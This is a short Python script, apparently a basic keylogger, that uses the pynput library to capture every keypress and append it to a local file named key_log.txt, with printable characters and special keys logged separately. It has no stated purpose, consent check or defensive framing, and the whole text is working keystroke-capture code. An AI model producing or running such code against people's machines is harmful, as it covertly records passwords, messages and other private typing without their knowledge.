from pynput import keyboard

# File to store logged keys
log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}\n")  # Printable characters
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"{key}\n")  # Special keys (e.g., space, enter)

# Start listening to keyboard events
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
